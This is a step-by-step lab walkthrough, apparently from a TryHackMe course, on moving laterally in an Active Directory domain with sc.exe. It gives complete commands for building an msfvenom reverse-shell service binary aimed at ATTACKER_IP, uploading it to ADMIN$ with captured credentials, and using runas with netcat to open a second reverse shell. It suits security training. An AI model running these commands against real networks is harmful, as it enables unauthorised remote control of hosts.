#### Move Laterally using `sc.exe`

Connect to the `JumpBox` using the credentials you have gathered via `ssh`:
```cmd
ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
```

**For this exercise, we will assume we have already captured some credentials with administrative access.**
1. We can ***upload any binary we'd like to execute and associate it with the created service***.
	Note: While it is possible to upload and execute any `.exe`, a ***standard executable will get killed immediately*** because:
		Service Manager will kill non-service executables.
	**Create a reverse shell**
	```bash
	msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o myservice.exe
	```

2. Use acquired credentials to upload the payload to the ADMIN$ using `smbclient`
```bash
smbclient -c 'put myservice.exe' -U <admin-username> -W ZA '//thmiis.za.tryhackme.com/admin$/' <admin-password> 
```
- `-c:` run a specific command after connecting.
- `put myservice.exe:` put uploads a file to the remote system.
- `-U:` username
- `-W ZA:` Domain name `za`

3. Once the executable is uploaded, set up a listener
```bash
use exploit/multi/handler
set lhost <IP>
set lport 4444
set payload windows/shell/reverse_tcp
run
```

4. Since `sc.exe` doesn't allow us to specify credentials as part of the command, we need to use ***`runas` to spawn a new shell with username's access token***. We only have SSH access to the machine, so If we tried `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the user's session, but we would have no access to it. To overcome this problem, we can use ***`runas` to spawn a second reverse shell with username's access token***:
```cmd
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> 5555"
```

5. Set up a reverse shell
```bash
nc -nvlp 5555
```

6. Finally, create a new service remotely by using `sc`
```cmd
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto 
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

**Once you have started the service, you should receive a connection on your first listener.**